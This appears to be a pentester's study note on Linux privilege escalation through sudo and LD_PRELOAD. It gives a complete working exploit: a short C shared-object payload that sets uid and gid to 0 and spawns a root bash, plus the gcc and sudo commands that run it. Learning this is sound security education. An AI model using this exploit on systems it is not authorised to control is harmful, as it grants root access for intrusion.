The sudo command, by default, allows you to run a program with root privileges.
	$ sudo -l

**Leverage LD_PRELOAD**
	![[Pasted image 20230702215050.png]]
LD_PRELOAD is a function that allows any program to use shared libraries. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. 

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;
	#include <stdio.h>  
	#include <sys/types.h>  
	#include <stdlib.h>  
	  
		void _init() {  
		unsetenv("LD_PRELOAD");  
		setgid(0);  
		setuid(0);  
		system("/bin/bash");  
		}

$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find